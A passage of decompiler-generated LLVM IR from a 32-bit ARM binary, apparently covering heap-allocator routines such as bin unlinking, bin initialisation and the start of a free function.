  store i32 %v3_12fc8, i32* %v2_12fdc, align 4
  %v0_12fec = load i32, i32* %r2.global-to-local, align 4
  %v1_12fec = load i32, i32* %ip.global-to-local, align 4
  %v2_12fec = add i32 %v1_12fec, 12
  %v3_12fec = inttoptr i32 %v2_12fec to i32*
  store i32 %v0_12fec, i32* %v3_12fec, align 4
  %v0_12ff0 = load i32, i32* %lr.global-to-local, align 4
  %v1_12ff0 = load i32, i32* %r5.global-to-local, align 4
  %v2_12ff0 = add i32 %v1_12ff0, %v0_12ff0
  store i32 %v2_12ff0, i32* %lr.global-to-local, align 4
  %v0_12ff8.pre = load i32, i32* @r0, align 4
  %v0_12ffc.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_12ff4

dec_label_pc_12ff4:                               ; preds = %dec_label_pc_12fa4, %dec_label_pc_12fe8
  %v0_1306c = phi i32 [ %v1_12fa8, %dec_label_pc_12fa4 ], [ %v2_12ff0, %dec_label_pc_12fe8 ]
  %v0_12ffc = phi i32 [ %v3_12fb8, %dec_label_pc_12fa4 ], [ %v0_12ffc.pre, %dec_label_pc_12fe8 ]
  %v1_13010 = phi i32 [ %v2_12fac, %dec_label_pc_12fa4 ], [ %v0_12ff8.pre, %dec_label_pc_12fe8 ]
  %v0_12ff4 = load i32, i32* @r4, align 4
  %v1_12ff4 = add i32 %v0_12ff4, 44
  %v2_12ff4 = inttoptr i32 %v1_12ff4 to i32*
  %v3_12ff4 = load i32, i32* %v2_12ff4, align 4
  store i32 %v3_12ff4, i32* %r3.global-to-local, align 4
  %v9_12ff8 = icmp eq i32 %v1_13010, %v3_12ff4
  %v1_12ffc = and i32 %v0_12ffc, -4
  store i32 %v1_12ffc, i32* %r5.global-to-local, align 4
  br i1 %v9_12ff8, label %dec_label_pc_1306c, label %dec_label_pc_13004

dec_label_pc_13004:                               ; preds = %dec_label_pc_12ff4
  %v2_13004 = add i32 %v1_13010, %v1_12ffc
  store i32 %v2_13004, i32* %r3.global-to-local, align 4
  %v1_13008 = add i32 %v2_13004, 4
  %v2_13008 = inttoptr i32 %v1_13008 to i32*
  %v3_13008 = load i32, i32* %v2_13008, align 4
  store i32 %v3_13008, i32* %r3.global-to-local, align 4
  %v1_1300c = urem i32 %v3_13008, 2
  %v2_1300c = icmp eq i32 %v1_1300c, 0
  %v2_13010 = add i32 %v1_13010, 4
  %v3_13010 = inttoptr i32 %v2_13010 to i32*
  store i32 %v1_12ffc, i32* %v3_13010, align 4
  br i1 %v2_1300c, label %dec_label_pc_13018, label %dec_label_pc_13004.dec_label_pc_13048_crit_edge

dec_label_pc_13004.dec_label_pc_13048_crit_edge:  ; preds = %dec_label_pc_13004
  %v0_1304c.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_13048

dec_label_pc_13018:                               ; preds = %dec_label_pc_13004
  %v0_13018 = load i32, i32* @r0, align 4
  %v1_13018 = add i32 %v0_13018, 8
  %v2_13018 = inttoptr i32 %v1_13018 to i32*
  %v3_13018 = load i32, i32* %v2_13018, align 4
  store i32 %v3_13018, i32* %ip.global-to-local, align 4
  %v1_1301c = add i32 %v3_13018, 12
  %v2_1301c = inttoptr i32 %v1_1301c to i32*
  %v3_1301c = load i32, i32* %v2_1301c, align 4
  store i32 %v3_1301c, i32* %r3.global-to-local, align 4
  %v9_13020 = icmp eq i32 %v3_1301c, %v0_13018
  %v1_13024 = add i32 %v0_13018, 12
  %v2_13024 = inttoptr i32 %v1_13024 to i32*
  %v3_13024 = load i32, i32* %v2_13024, align 4
  store i32 %v3_13024, i32* %r2.global-to-local, align 4
  br i1 %v9_13020, label %dec_label_pc_1302c, label %dec_label_pc_13038

dec_label_pc_1302c:                               ; preds = %dec_label_pc_13018
  %v1_1302c = add i32 %v3_13024, 8
  %v2_1302c = inttoptr i32 %v1_1302c to i32*
  %v3_1302c = load i32, i32* %v2_1302c, align 4
  store i32 %v3_1302c, i32* %r3.global-to-local, align 4
  %v9_13030 = icmp eq i32 %v3_1302c, %v0_13018
  br i1 %v9_13030, label %dec_label_pc_1303c, label %dec_label_pc_13038

dec_label_pc_13038:                               ; preds = %dec_label_pc_13018, %dec_label_pc_12fdc, %dec_label_pc_12fc0, %dec_label_pc_1302c
  %v0_13038 = call i32 @abort()
  store i32 %v0_13038, i32* @r0, align 4
  %v0_1303c.pre = load i32, i32* @ip, align 4
  %v1_1303c.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_1303c

dec_label_pc_1303c:                               ; preds = %dec_label_pc_1302c, %dec_label_pc_13038
  %v1_1303c = phi i32 [ %v3_13024, %dec_label_pc_1302c ], [ %v1_1303c.pre, %dec_label_pc_13038 ]
  %v0_1303c = phi i32 [ %v3_13018, %dec_label_pc_1302c ], [ %v0_1303c.pre, %dec_label_pc_13038 ]
  %v2_1303c = add i32 %v1_1303c, 8
  %v3_1303c = inttoptr i32 %v2_1303c to i32*
  store i32 %v0_1303c, i32* %v3_1303c, align 4
  %v0_13040 = load i32, i32* %r2.global-to-local, align 4
  %v1_13040 = load i32, i32* %ip.global-to-local, align 4
  %v2_13040 = add i32 %v1_13040, 12
  %v3_13040 = inttoptr i32 %v2_13040 to i32*
  store i32 %v0_13040, i32* %v3_13040, align 4
  %v0_13044 = load i32, i32* %lr.global-to-local, align 4
  %v1_13044 = load i32, i32* %r5.global-to-local, align 4
  %v2_13044 = add i32 %v1_13044, %v0_13044
  store i32 %v2_13044, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_13048

dec_label_pc_13048:                               ; preds = %dec_label_pc_13004.dec_label_pc_13048_crit_edge, %dec_label_pc_1303c
  %v0_1304c = phi i32 [ %v0_1304c.pre, %dec_label_pc_13004.dec_label_pc_13048_crit_edge ], [ %v2_13044, %dec_label_pc_1303c ]
  %v0_13048 = load i32, i32* %r7.global-to-local, align 4
  %v1_13048 = add i32 %v0_13048, 8
  %v2_13048 = inttoptr i32 %v1_13048 to i32*
  %v3_13048 = load i32, i32* %v2_13048, align 4
  store i32 %v3_13048, i32* %r2.global-to-local, align 4
  %v1_1304c = or i32 %v0_1304c, 1
  store i32 %v1_1304c, i32* %r3.global-to-local, align 4
  %v0_13050 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_13050, i32* %v2_13048, align 4
  %v0_13054 = load i32, i32* %r1.global-to-local, align 4
  %v1_13054 = load i32, i32* %r2.global-to-local, align 4
  %v2_13054 = add i32 %v1_13054, 12
  %v3_13054 = inttoptr i32 %v2_13054 to i32*
  store i32 %v0_13054, i32* %v3_13054, align 4
  %v0_13058 = load i32, i32* %lr.global-to-local, align 4
  %v1_13058 = load i32, i32* %r1.global-to-local, align 4
  %v3_13058 = add i32 %v1_13058, %v0_13058
  %v4_13058 = inttoptr i32 %v3_13058 to i32*
  store i32 %v0_13058, i32* %v4_13058, align 4
  %v0_1305c = load i32, i32* %r3.global-to-local, align 4
  %v1_1305c = load i32, i32* %r1.global-to-local, align 4
  %v2_1305c = add i32 %v1_1305c, 4
  %v3_1305c = inttoptr i32 %v2_1305c to i32*
  store i32 %v0_1305c, i32* %v3_1305c, align 4
  %v0_13060 = load i32, i32* %r2.global-to-local, align 4
  %v1_13060 = load i32, i32* %r1.global-to-local, align 4
  %v2_13060 = add i32 %v1_13060, 8
  %v3_13060 = inttoptr i32 %v2_13060 to i32*
  store i32 %v0_13060, i32* %v3_13060, align 4
  %v0_13064 = load i32, i32* %r7.global-to-local, align 4
  %v1_13064 = load i32, i32* %r1.global-to-local, align 4
  %v2_13064 = add i32 %v1_13064, 12
  %v3_13064 = inttoptr i32 %v2_13064 to i32*
  store i32 %v0_13064, i32* %v3_13064, align 4
  br label %dec_label_pc_1307c

dec_label_pc_1306c:                               ; preds = %dec_label_pc_12ff4
  %v2_1306c = add i32 %v1_12ffc, %v0_1306c
  %v1_13070 = or i32 %v2_1306c, 1
  store i32 %v1_13070, i32* %r3.global-to-local, align 4
  %v1_13074 = load i32, i32* %r1.global-to-local, align 4
  %v2_13074 = add i32 %v1_13074, 4
  %v3_13074 = inttoptr i32 %v2_13074 to i32*
  store i32 %v1_13070, i32* %v3_13074, align 4
  %v0_13078 = load i32, i32* %r1.global-to-local, align 4
  %v1_13078 = load i32, i32* @r4, align 4
  %v2_13078 = add i32 %v1_13078, 44
  %v3_13078 = inttoptr i32 %v2_13078 to i32*
  store i32 %v0_13078, i32* %v3_13078, align 4
  br label %dec_label_pc_1307c

dec_label_pc_1307c:                               ; preds = %dec_label_pc_13048, %dec_label_pc_1306c
  %v0_1307c = load i32, i32* %sl.global-to-local, align 4
  %v2_1307c = icmp eq i32 %v0_1307c, 0
  store i32 %v0_1307c, i32* %r1.global-to-local, align 4
  br i1 %v2_1307c, label %dec_label_pc_13088.loopexit, label %dec_label_pc_12fa4

dec_label_pc_13088.loopexit:                      ; preds = %dec_label_pc_1307c
  %v0_13088.pre = load i32, i32* %r6.global-to-local, align 4
  %v1_13088.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_13088

dec_label_pc_13088:                               ; preds = %dec_label_pc_13088.loopexit, %dec_label_pc_12f94
  %v1_13088 = phi i32 [ %v1_13088.pre, %dec_label_pc_13088.loopexit ], [ %v1_1308810, %dec_label_pc_12f94 ]
  %v0_13090 = phi i32 [ %v0_13088.pre, %dec_label_pc_13088.loopexit ], [ %v1_12fa0, %dec_label_pc_12f94 ]
  %v9_13088 = icmp eq i32 %v0_13090, %v1_13088
  br i1 %v9_13088, label %dec_label_pc_13100, label %dec_label_pc_13090

dec_label_pc_13090:                               ; preds = %dec_label_pc_13088
  %v1_13090 = add i32 %v0_13090, 4
  store i32 %v1_13090, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_12f94

dec_label_pc_13098.dec_label_pc_13098_crit_edge:  ; preds = %dec_label_pc_13098.preheader, %dec_label_pc_13098.dec_label_pc_13098_crit_edge
  %v0_13098.pre = load i32, i32* @r4, align 4
  %v1_13098.pre = load i32, i32* %r2.global-to-local, align 4
  %v4_13098 = mul i32 %v1_13098.pre, 8
  %v5_13098 = add i32 %v4_13098, %v0_13098.pre
  %v1_1309c = add i32 %v1_13098.pre, 1
  store i32 %v1_1309c, i32* %r2.global-to-local, align 4
  %v1_130a0 = add i32 %v5_13098, 44
  store i32 %v1_130a0, i32* %r3.global-to-local, align 4
  %v2_130a8 = add i32 %v5_13098, 52
  %v3_130a8 = inttoptr i32 %v2_130a8 to i32*
  store i32 %v1_130a0, i32* %v3_130a8, align 4
  %v0_130ac = load i32, i32* %r3.global-to-local, align 4
  %v2_130ac = add i32 %v0_130ac, 12
  %v3_130ac = inttoptr i32 %v2_130ac to i32*
  store i32 %v0_130ac, i32* %v3_130ac, align 4
  %v7_130b0 = icmp sgt i32 %v1_1309c, 95
  br i1 %v7_130b0, label %dec_label_pc_130b4, label %dec_label_pc_13098.dec_label_pc_13098_crit_edge

dec_label_pc_130b4:                               ; preds = %dec_label_pc_13098.dec_label_pc_13098_crit_edge
  %v0_130b4 = load i32, i32* @r4, align 4
  %v1_130b4 = inttoptr i32 %v0_130b4 to i32*
  %v2_130b4 = load i32, i32* %v1_130b4, align 4
  store i32 %v2_130b4, i32* %r2.global-to-local, align 4
  %v1_130b8 = add i32 %v0_130b4, 864
  %v2_130b8 = inttoptr i32 %v1_130b8 to i32*
  %v3_130b8 = load i32, i32* %v2_130b8, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_130c0 = urem i32 %v2_130b4, 4
  store i32 262144, i32* %r0.global-to-local, align 4
  %v1_130c8 = or i32 %v3_130b8, 1
  store i32 %v1_130c8, i32* %r1.global-to-local, align 4
  %v1_130cc = or i32 %v1_130c0, 72
  store i32 %v1_130cc, i32* %r2.global-to-local, align 4
  %v1_130d0 = add i32 %v0_130b4, 52
  store i32 %v1_130d0, i32* %ip.global-to-local, align 4
  %v2_130d4 = add i32 %v0_130b4, 840
  %v3_130d4 = inttoptr i32 %v2_130d4 to i32*
  store i32 0, i32* %v3_130d4, align 4
  %v0_130d8 = load i32, i32* %r3.global-to-local, align 4
  %v1_130d8 = add i32 %v0_130d8, 65536
  store i32 %v1_130d8, i32* %r3.global-to-local, align 4
  %v0_130dc = load i32, i32* %r0.global-to-local, align 4
  %v1_130dc = load i32, i32* @r4, align 4
  %v2_130dc = add i32 %v1_130dc, 836
  %v3_130dc = inttoptr i32 %v2_130dc to i32*
  store i32 %v0_130dc, i32* %v3_130dc, align 4
  %v0_130e0 = load i32, i32* %r0.global-to-local, align 4
  %v1_130e0 = load i32, i32* @r4, align 4
  %v2_130e0 = add i32 %v1_130e0, 844
  %v3_130e0 = inttoptr i32 %v2_130e0 to i32*
  store i32 %v0_130e0, i32* %v3_130e0, align 4
  %v1_130e4 = load i32, i32* @r4, align 4
  %v2_130e4 = add i32 %v1_130e4, 852
  %v3_130e4 = inttoptr i32 %v2_130e4 to i32*
  store i32 %v1_130d8, i32* %v3_130e4, align 4
  %v1_130e8 = load i32, i32* @r4, align 4
  %v2_130e8 = add i32 %v1_130e8, 864
  %v3_130e8 = inttoptr i32 %v2_130e8 to i32*
  store i32 %v1_130c8, i32* %v3_130e8, align 4
  %v1_130ec = load i32, i32* @r4, align 4
  %v2_130ec = inttoptr i32 %v1_130ec to i32*
  store i32 %v1_130cc, i32* %v2_130ec, align 4
  %v0_130f0 = load i32, i32* %ip.global-to-local, align 4
  %v1_130f0 = load i32, i32* @r4, align 4
  %v2_130f0 = add i32 %v1_130f0, 44
  %v3_130f0 = inttoptr i32 %v2_130f0 to i32*
  store i32 %v0_130f0, i32* %v3_130f0, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v4_130f8 = call i32 @sysconf(i32 30, i32 %v1_130c8, i32 %v1_130cc, i32 %v1_130d8)
  store i32 %v4_130f8, i32* @r0, align 4
  %v1_130fc = load i32, i32* @r4, align 4
  %v2_130fc = add i32 %v1_130fc, 860
  %v3_130fc = inttoptr i32 %v2_130fc to i32*
  store i32 %v4_130f8, i32* %v3_130fc, align 4
  br label %dec_label_pc_13100

dec_label_pc_13100:                               ; preds = %dec_label_pc_13088, %dec_label_pc_130b4
  %v2_13104 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_13104, i32* @r4, align 4
  %v1_13108 = load i32, i32* @r0, align 4
  ret i32 %v1_13108

; uselistorder directives
  uselistorder i32 %v0_130b4, { 1, 0, 2, 3 }
  uselistorder i32 %v0_130ac, { 1, 0 }
  uselistorder i32 %v1_13090, { 1, 0 }
  uselistorder i32 %v0_1307c, { 0, 2, 1 }
  uselistorder i32 %v0_13058, { 1, 0 }
  uselistorder i32 %v1_12fa8, { 1, 0, 2 }
  uselistorder i32 %v0_12fc0, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_12f80, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 19, 17 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 12, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 4, 5, 6, 7, 8, 9, 10, 11, 2, 3, 12 }
  uselistorder i32* %lr.global-to-local, { 3, 0, 4, 2, 1, 5, 6 }
  uselistorder i32 860, { 2, 1, 0, 3 }
  uselistorder i32 30, { 1, 10, 0, 8, 9, 6, 7, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_13100, { 1, 0 }
  uselistorder label %dec_label_pc_13098.dec_label_pc_13098_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1307c, { 1, 0 }
  uselistorder label %dec_label_pc_13048, { 1, 0 }
  uselistorder label %dec_label_pc_1303c, { 1, 0 }
  uselistorder label %dec_label_pc_13038, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_12ff4, { 1, 0 }
}

define i32 @free() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_1310c = load i32, i32* @r4, align 4
  %v6_1310c = load i32, i32* @r5, align 4
  %v9_1310c = load i32, i32* @r6, align 4
  %v12_1310c = load i32, i32* @r7, align 4
  %v18_1310c = load i32, i32* @lr, align 4
  %v0_13114 = load i32, i32* @r0, align 4
  store i32 %v0_13114, i32* @r6, align 4
  %v2_13114 = icmp eq i32 %v0_13114, 0
  %v2_13118 = ptrtoint i32* %stack_var_-40 to i32
  store i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32* @r7, align 4
  br i1 %v2_13114, label %dec_label_pc_13320, label %dec_label_pc_13124

dec_label_pc_13124:                               ; preds = %entry
  store i32 108, i32* %r3.global-to-local, align 4
  %v4_13128 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 108) to i32*), align 4
  store i32 %v4_13128, i32* %r4.global-to-local, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 %v4_13128, i32* %r2.global-to-local, align 4
  %v4_13134 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 68) to i32*), align 4
  store i32 %v4_13134, i32* %r1.global-to-local, align 4
  store i32 %v2_13118, i32* %r0.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_13140 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 112) to i32*), align 4
  store i32 %v4_13140, i32* %ip.global-to-local, align 4
  store i32 78156, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_13140)
  %v0_1314c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1314c, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_13154 = load i32, i32* @r7, align 4
  %v2_13154 = add i32 %v0_13154, 16
  %v3_13154 = inttoptr i32 %v2_13154 to i32*
  %v4_13154 = load i32, i32* %v3_13154, align 4
  store i32 %v4_13154, i32* %ip.global-to-local, align 4
  store i32 78176, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_13154)
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_13164 = load i32, i32* @r7, align 4
  %v2_13164 = add i32 %v0_13164, 64
  %v3_13164 = inttoptr i32 %v2_13164 to i32*
  %v4_13164 = load i32, i32* %v3_13164, align 4
  store i32 %v4_13164, i32* @lr, align 4
  %v0_13168 = load i32, i32* @r6, align 4
  %v1_13168 = add i32 %v0_13168, -4
  %v2_13168 = inttoptr i32 %v1_13168 to i32*
  %v3_13168 = load i32, i32* %v2_13168, align 4
  store i32 %v3_13168, i32* %r2.global-to-local, align 4
  %v1_1316c = inttoptr i32 %v4_13164 to i32*
  %v2_1316c = load i32, i32* %v1_1316c, align 4
  store i32 %v2_1316c, i32* %r3.global-to-local, align 4
  %v1_13170 = and i32 %v3_13168, -4
  store i32 %v1_13170, i32* %ip.global-to-local, align 4
  %v1_13174 = add i32 %v0_13168, -8
  store i32 %v1_13174, i32* @r5, align 4
  store i32 %v1_13174, i32* %r4.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_13170, %v2_1316c
  br i1 %tmp, label %dec_label_pc_131a4, label %dec_label_pc_13184

dec_label_pc_13184:                               ; preds = %dec_label_pc_13124
  %v1_13184 = or i32 %v2_1316c, 3
  store i32 %v1_13184, i32* %r3.global-to-local, align 4
  store i32 %v1_13184, i32* %v1_1316c, align 4
  %v3_13188 = load i32, i32* @lr, align 4
  %v4_13188 = add i32 %v3_13188, -8
  store i32 %v4_13188, i32* %lr.global-to-local, align 4
  %v0_1318c = load i32, i32* %ip.global-to-local, align 4
  %v3_1318c = udiv i32 %v0_1318c, 8
  store i32 %v3_1318c, i32* %r1.global-to-local, align 4
  %v1_13190 = add i32 %v3_13188, -4
  store i32 %v1_13190, i32* %r2.global-to-local, align 4
  %v4_13194 = mul nuw i32 %v3_1318c, 4
  %v5_13194 = add i32 %v4_13194, %v1_13190
  %v6_13194 = inttoptr i32 %v5_13194 to i32*
  %v7_13194 = load i32, i32* %v6_13194, align 4
  store i32 %v7_13194, i32* %r3.global-to-local, align 4
  %v1_13198 = load i32, i32* @r5, align 4
  %v2_13198 = add i32 %v1_13198, 8
  %v3_13198 = inttoptr i32 %v2_13198 to i32*
  store i32 %v7_13194, i32* %v3_13198, align 4
  %v0_1319c = load i32, i32* @r5, align 4
  %v1_1319c = load i32, i32* %r2.global-to-local, align 4
  %v2_1319c = load i32, i32* %r1.global-to-local, align 4
  %v5_1319c = mul i32 %v2_1319c, 4
  %v6_1319c = add i32 %v5_1319c, %v1_1319c
  %v7_1319c = inttoptr i32 %v6_1319c to i32*
  store i32 %v0_1319c, i32* %v7_1319c, align 4
  br label %dec_label_pc_13308

dec_label_pc_131a4:                               ; preds = %dec_label_pc_13124
  %v1_131a4 = and i32 %v3_13168, 2
  %v2_131a4 = icmp eq i32 %v1_131a4, 0
  br i1 %v2_131a4, label %dec_label_pc_131ac, label %dec_label_pc_132e0

dec_label_pc_131ac:                               ; preds = %dec_label_pc_131a4
  %v1_131ac = or i32 %v2_1316c, 1
  store i32 %v1_131ac, i32* %r3.global-to-local, align 4
  store i32 %v1_131ac, i32* %v1_1316c, align 4
  %v0_131b4 = load i32, i32* @r6, align 4
  %v1_131b4 = add i32 %v0_131b4, -4
  %v2_131b4 = inttoptr i32 %v1_131b4 to i32*
  %v3_131b4 = load i32, i32* %v2_131b4, align 4
  store i32 %v3_131b4, i32* %r3.global-to-local, align 4
  %v0_131b8 = load i32, i32* @r5, align 4
  %v1_131b8 = load i32, i32* %ip.global-to-local, align 4
  %v2_131b8 = add i32 %v1_131b8, %v0_131b8
  store i32 %v2_131b8, i32* %lr.global-to-local, align 4
  %v1_131bc = urem i32 %v3_131b4, 2
  %v2_131bc = icmp eq i32 %v1_131bc, 0
  %v1_131c0 = add i32 %v2_131b8, 4
  %v2_131c0 = inttoptr i32 %v1_131c0 to i32*
  %v3_131c0 = load i32, i32* %v2_131c0, align 4
  store i32 %v3_131c0, i32* %r8.global-to-local, align 4
  br i1 %v2_131bc, label %dec_label_pc_131c8, label %dec_label_pc_131fc

dec_label_pc_131c8:                               ; preds = %dec_label_pc_131ac
  %v1_131c8 = add i32 %v0_131b4, -8
  %v2_131c8 = inttoptr i32 %v1_131c8 to i32*
  %v3_131c8 = load i32, i32* %v2_131c8, align 4
  store i32 %v3_131c8, i32* %r1.global-to-local, align 4
  %v2_131cc = sub i32 %v0_131b8, %v3_131c8
  store i32 %v2_131cc, i32* %r3.global-to-local, align 4
  %v1_131d0 = add i32 %v2_131cc, 8
  %v2_131d0 = inttoptr i32 %v1_131d0 to i32*
  %v3_131d0 = load i32, i32* %v2_131d0, align 4
  store i32 %v3_131d0, i32* %r2.global-to-local, align 4
  %v1_131d4 = add i32 %v3_131d0, 12
  %v2_131d4 = inttoptr i32 %v1_131d4 to i32*
  %v3_131d4 = load i32, i32* %v2_131d4, align 4
  store i32 %v3_131d4, i32* %r4.global-to-local, align 4
  %v9_131d8 = icmp eq i32 %v3_131d4, %v2_131cc
  %v1_131dc = add i32 %v2_131cc, 12
  %v2_131dc = inttoptr i32 %v1_131dc to i32*
  %v3_131dc = load i32, i32* %v2_131dc, align 4
  store i32 %v3_131dc, i32* %r0.global-to-local, align 4
  br i1 %v9_131d8, label %dec_label_pc_131e4, label %dec_label_pc_13248

dec_label_pc_131e4:                               ; preds = %dec_label_pc_131c8
  %v1_131e4 = add i32 %v3_131dc, 8
  %v2_131e4 = inttoptr i32 %v1_131e4 to i32*
  %v3_131e4 = load i32, i32* %v2_131e4, align 4
  store i32 %v3_131e4, i32* %r3.global-to-local, align 4
  %v9_131e8 = icmp eq i32 %v3_131e4, %v2_131cc
  br i1 %v9_131e8, label %dec_label_pc_131f0, label %dec_label_pc_13248

dec_label_pc_131f0:                               ; preds = %dec_label_pc_131e4
  store i32 %v3_131d0, i32* %v2_131e4, align 4
  %v0_131f4 = load i32, i32* %r0.global-to-local, align 4
  %v1_131f4 = load i32, i32* %r2.global-to-local, align 4
  %v2_131f4 = add i32 %v1_131f4, 12
  %v3_131f4 = inttoptr i32 %v2_131f4 to i32*
  store i32 %v0_131f4, i32* %v3_131f4, align 4
  %v0_131f8 = load i32, i32* %ip.global-to-local, align 4
  %v1_131f8 = load i32, i32* %r1.global-to-local, align 4
  %v2_131f8 = add i32 %v1_131f8, %v0_131f8
  store i32 %v2_131f8, i32* %ip.global-to-local, align 4
  %v0_13208.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_1320c.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_131fc

dec_label_pc_131fc:                               ; preds = %dec_label_pc_131ac, %dec_label_pc_131f0
  %v0_13288 = phi i32 [ %v1_131b8, %dec_label_pc_131ac ], [ %v2_131f8, %dec_label_pc_131f0 ]
  %v0_1320c = phi i32 [ %v3_131c0, %dec_label_pc_131ac ], [ %v0_1320c.pre, %dec_label_pc_131f0 ]
  %v1_13220 = phi i32 [ %v2_131b8, %dec_label_pc_131ac ], [ %v0_13208.pre, %dec_label_pc_131f0 ]
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_13200 = load i32, i32* @r7, align 4
  %v2_13200 = add i32 %v0_13200, 64
  %v3_13200 = inttoptr i32 %v2_13200 to i32*
  %v4_13200 = load i32, i32* %v3_13200, align 4
  store i32 %v4_13200, i32* %r2.global-to-local, align 4
  %v1_13204 = add i32 %v4_13200, 44
  %v2_13204 = inttoptr i32 %v1_13204 to i32*
  %v3_13204 = load i32, i32* %v2_13204, align 4
  store i32 %v3_13204, i32* %r3.global-to-local, align 4
  %v9_13208 = icmp eq i32 %v1_13220, %v3_13204
  %v1_1320c = and i32 %v0_1320c, -4
  store i32 %v1_1320c, i32* %r0.global-to-local, align 4
  br i1 %v9_13208, label %dec_label_pc_13288, label %dec_label_pc_13214

dec_label_pc_13214:                               ; preds = %dec_label_pc_131fc
  %v2_13214 = add i32 %v1_13220, %v1_1320c
  store i32 %v2_13214, i32* %r3.global-to-local, align 4
  %v1_13218 = add i32 %v2_13214, 4
  %v2_13218 = inttoptr i32 %v1_13218 to i32*
  %v3_13218 = load i32, i32* %v2_13218, align 4
  store i32 %v3_13218, i32* %r3.global-to-local, align 4
  %v1_1321c = urem i32 %v3_13218, 2
  %v2_1321c = icmp eq i32 %v1_1321c, 0
  %v2_13220 = add i32 %v1_13220, 4
  %v3_13220 = inttoptr i32 %v2_13220 to i32*
  store i32 %v1_1320c, i32* %v3_13220, align 4
  br i1 %v2_1321c, label %dec_label_pc_13228, label %dec_label_pc_13214.dec_label_pc_13258_crit_edge

dec_label_pc_13214.dec_label_pc_13258_crit_edge:  ; preds = %dec_label_pc_13214
  %v0_13268.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_13258

dec_label_pc_13228:                               ; preds = %dec_label_pc_13214
  %v0_13228 = load i32, i32* %lr.global-to-local, align 4
  %v1_13228 = add i32 %v0_13228, 8
  %v2_13228 = inttoptr i32 %v1_13228 to i32*
  %v3_13228 = load i32, i32* %v2_13228, align 4
  store i32 %v3_13228, i32* %r1.global-to-local, align 4
  %v1_1322c = add i32 %v3_13228, 12
  %v2_1322c = inttoptr i32 %v1_1322c to i32*
  %v3_1322c = load i32, i32* %v2_1322c, align 4
  store i32 %v3_1322c, i32* %r3.global-to-local, align 4
  %v9_13230 = icmp eq i32 %v3_1322c, %v0_13228
  %v1_13234 = add i32 %v0_13228, 12
  %v2_13234 = inttoptr i32 %v1_13234 to i32*
  %v3_13234 = load i32, i32* %v2_13234, align 4
  store i32 %v3_13234, i32* %r2.global-to-local, align 4
  br i1 %v9_13230, label %dec_label_pc_1323c, label %dec_label_pc_13248

dec_label_pc_1323c:                               ; preds = %dec_label_pc_13228
  %v1_1323c = add i32 %v3_13234, 8
  %v2_1323c = inttoptr i32 %v1_1323c to i32*
  %v3_1323c = load i32, i32* %v2_1323c, align 4
  store i32 %v3_1323c, i32* %r3.global-to-local, align 4
  %v9_13240 = icmp eq i32 %v3_1323c, %v0_13228
  br i1 %v9_13240, label %dec_label_pc_1324c, label %dec_label_pc_13248

dec_label_pc_13248:                               ; preds = %dec_label_pc_13228, %dec_label_pc_131e4, %dec_label_pc_131c8, %dec_label_pc_1323c
  %v0_13248 = call i32 @abort()
  store i32 %v0_13248, i32* %r0.global-to-local, align 4
  %v0_1324c.pre = load i32, i32* @r1, align 4
  %v1_1324c.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_1324c

dec_label_pc_1324c:                               ; preds = %dec_label_pc_1323c, %dec_label_pc_13248
  %v1_1324c = phi i32 [ %v3_13234, %dec_label_pc_1323c ], [ %v1_1324c.pre, %dec_label_pc_13248 ]
  %v0_1324c = phi i32 [ %v3_13228, %dec_label_pc_1323c ], [ %v0_1324c.pre, %dec_label_pc_13248 ]
  %v2_1324c = add i32 %v1_1324c, 8
  %v3_1324c = inttoptr i32 %v2_1324c to i32*
  store i32 %v0_1324c, i32* %v3_1324c, align 4
  %v0_13250 = load i32, i32* %r2.global-to-local, align 4
  %v1_13250 = load i32, i32* %r1.global-to-local, align 4
  %v2_13250 = add i32 %v1_13250, 12
  %v3_13250 = inttoptr i32 %v2_13250 to i32*
  store i32 %v0_13250, i32* %v3_13250, align 4
  %v0_13254 = load i32, i32* %ip.global-to-local, align 4
  %v1_13254 = load i32, i32* %r0.global-to-local, align 4
